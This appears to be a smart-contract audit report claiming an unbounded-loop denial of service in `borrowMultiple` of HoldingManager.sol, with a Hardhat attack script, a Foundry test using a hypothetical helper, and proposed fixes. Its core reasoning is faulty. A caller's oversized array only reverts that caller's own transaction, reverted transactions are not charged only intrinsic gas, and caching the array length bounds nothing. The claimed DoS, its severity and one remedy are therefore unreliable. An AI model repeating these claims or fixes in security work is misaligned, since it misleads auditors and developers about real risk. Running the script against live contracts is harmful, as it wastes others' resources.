# Unbounded Loop in `borrowMultiple` Enables DoS via Oversized `_data` (HoldingManager.sol)

## Summary
The `borrowMultiple` function iterates directly over the user‑supplied `_data` array without bounding its length. An attacker can craft a transaction with an excessively long `_data` array, causing the loop to consume all available block gas and effectively **block other users from borrowing** (denial‑of‑service).

## Finding Description
At **line 309** in `HoldingManager.sol`:

```solidity
for (uint256 i = 0; i < _data.length; i++) {
```

Because `_data.length` is **completely under user control**, an attacker can supply a huge array:

```solidity
BorrowData[] calldata _data  // supplied by caller
```

Each iteration performs:

1. A storage read (`_getStablesManager()`).
2. An external call to `borrow` that includes:
   * State‑changing logic in another contract.
   * Multiple events (`Borrowed`, `BorrowedMultiple`).

Repeated thousands of times, this guarantees the transaction **exceeds the block gas limit**, wasting miner/validator effort and **reverting the entire transaction**. While miners can still include such a tx if the attacker pays enough gas, **legitimate users** will see their own calls stuck behind these bloated tx attempts or will pay inflated gas prices.  
If a malicious user continually submits these over‑long transactions, they can **lock up** the `borrowMultiple` functionality for everyone (DoS).

### Key Reasons This Is Critical
* **Externally controlled loop bound** — worst‑case O(n) with n unbounded.  
* **Heavy body** — each iteration performs an external call that may itself be expensive.  
* **Core functionality** — borrowing is likely a high‑frequency, business‑critical path.

## Impact Explanation
* **Denial‑of‑Service:** A single attacker can repeatedly spam transactions, keeping the contract in a reverting state, clogging the mempool and denying legitimate borrowers.  
* **Gas griefing:** Even if the transaction is mined, it can consume near‑block‑gas, disincentivizing validators from including other important transactions in the same block.  
* **Economic Damage:** Borrowers unable to open positions may miss liquidation windows or arbitrage opportunities, leading to cascading financial loss.

Given borrowing is fundamental to protocol utility, the impact is rated **High**.

## Likelihood Explanation
* **Low technical barrier:** No special permissions; any user can call `borrowMultiple`.  
* **Cheap for attacker:** Crafting a large calldata array is trivial; even if reverted, attacker pays only the intrinsic gas.  
* **Block‑level persistence:** Attack can be automated via bots to maintain pressure.

Overall **likelihood is Medium–High**.

## Proof of Concept

### ⚙️ Normal Script (Hardhat/Node)
```javascript
// scripts/dosBorrowMultiple.js
const { ethers } = require("hardhat");

async function main() {
  const hm = await ethers.getContractAt("HoldingManager", "<HM_ADDRESS>");
  const tokenAddr = "<STABLE_TOKEN>";
  const big = ethers.BigNumber.from;
  const entries = 5000; // adjust until near block gas limit

  let data = [];
  for (let i = 0; i < entries; i++) {
    data.push({
      token: tokenAddr,
      amount: big("1"),
      minJUsdAmountOut: big("0")
    });
  }

  const tx = await hm.borrowMultiple(data, false, { gasLimit: 30_000_000 });
  console.log("tx submitted:", tx.hash);
}

main();
```
Run with:
```bash
npx hardhat run scripts/dosBorrowMultiple.js --network <target>
```
The tx **reverts for running out of gas**, but ties up the mempool and wastes gas.

---

### 🛠 Foundry Test

```solidity
// test/BorrowMultipleDoS.t.sol
// forge test -vv

pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import "../src/HoldingManager.sol";
import "../src/Mocks/MockStablesManager.sol";

contract BorrowMultipleDoS is Test {
    HoldingManager hm;
    MockStablesManager sm;
    address attacker = address(0xA11CE);

    function setUp() public {
        sm = new MockStablesManager();
        hm = new HoldingManager(address(sm));
        // assume HoldingManager constructor wires deps & creates holding for attacker
        vm.prank(attacker);
        hm.registerHolding(); // hypothetical helper
    }

    function testGasExhaustion() public {
        vm.startPrank(attacker);

        uint256 entries = 6000; // tune per environment
        HoldingManager.BorrowData[] memory data = new HoldingManager.BorrowData[](entries);

        for (uint256 i = 0; i < entries; i++) {
            data[i] = HoldingManager.BorrowData({
                token: address(0xDEADBEEF),
                amount: 1 ether,
                minJUsdAmountOut: 0
            });
        }

        // Expect revert due to out‑of‑gas
        vm.expectRevert();
        hm.borrowMultiple(data, false);

        vm.stopPrank();
    }
}
```

Running `forge test` will show the function reverts once gas exceeds the limit, proving the DoS vector.

## Recommendation
**Option 1: Cache Length**
```solidity
uint256 len = _data.length;
for (uint256 i = 0; i < len; i++) { ... }
```

**Option 2: Explicit Limit**
```solidity
uint256 len = _data.length;
require(len <= dataLimit, "Too many data entries");
```
Where `dataLimit` is a *mutable* storage variable set via governance.

Either solution removes the unbounded loop condition and thwarts gas‑griefing attacks.
